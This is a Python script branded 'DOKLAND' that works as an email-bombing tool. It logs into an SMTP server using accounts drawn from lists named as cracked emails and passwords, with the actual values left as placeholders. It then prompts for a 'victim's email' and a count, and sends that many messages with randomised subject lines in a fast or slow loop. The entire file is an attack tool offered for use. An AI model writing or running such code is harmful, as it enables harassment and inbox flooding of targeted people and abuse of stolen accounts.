import time
import smtplib
import os
import random
import string
clear = lambda: os.system("cls")
stop = "\033[0m"
 
def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))
 
email = smtplib.SMTP("xxx", xxx)
email.ehlo()
email.starttls()

mailCounter = random.randint(0, 1)
crackedMails = ["xxx", "xxx"]
crackedMailpass = ["xxx", "xxx"]

logo='''
       __            __        __                            __       
      |  \          |  \      |  \                          |  \      
  ____| $$  ______  | $$   __ | $$  ______   _______    ____| $$      
 /      $$ /      \ | $$  /  \| $$ |      \ |       \  /      $$      
|  $$$$$$$|  $$$$$$\| $$_/  $$| $$  \$$$$$$\| $$$$$$$\|  $$$$$$$      
| $$  | $$| $$  | $$| $$   $$ | $$ /      $$| $$  | $$| $$  | $$      
| $$__| $$| $$__/ $$| $$$$$$\ | $$|  $$$$$$$| $$  | $$| $$__| $$      
 \$$    $$ \$$    $$| $$  \$$\| $$ \$$    $$| $$  | $$ \$$    $$      
  \$$$$$$$  \$$$$$$  \$$   \$$ \$$  \$$$$$$$ \$$   \$$  \$$$$$$$
  
  '''
    
x = 0

print(logo)
print("")
print("[DOKLAND] Selecting an email from the array.")

mail_login = crackedMails[mailCounter]
password_login = crackedMailpass[mailCounter]

try:
    email.login(mail_login, password_login)
except smtplib.SMTPAuthenticationError:
    print("[DOKLAND] Error")
    time.sleep(2.5)
    exit()
 
email_receiver = input("[DOKLAND] Victim's email: ")

object = ("Spammed by DOKLAND's Spammer" + randomString(10) + "\n\n")
content = (randomString(200))
message = object + content
 
number_send_mail = int(input("[DOKLAND] Value: "))
content = str(input("[DOKLAND] Message:"))
idkk = input("[DOKLAND] Fast/slow mode:")
idkk = idkk.lower()
if idkk == "fast":
    while x < number_send_mail:
        x_print = str(x + 1)
        email.sendmail(mail_login, email_receiver, message)
        print("[DOKLAND] Sent " + (x_print) + " mails to " + email_receiver + ".")
        object = ("Subject: " + randomString(25) + "\n\n")
        message = object + content
        x += 1
if idkk == "slow":
    while x < number_send_mail:
        x_print = str(x + 1)
        email.sendmail(mail_login, email_receiver, message)
        print("[DOKLAND] Sent " + (x_print) + " mails to " + email_receiver + ".")
        object = ("Subject: " + randomString(25) + "\n\n")
        message = object + content
        x += 1
        time.sleep(1)
clear()
print("[DOKLAND] Finished")
time.sleep(5)
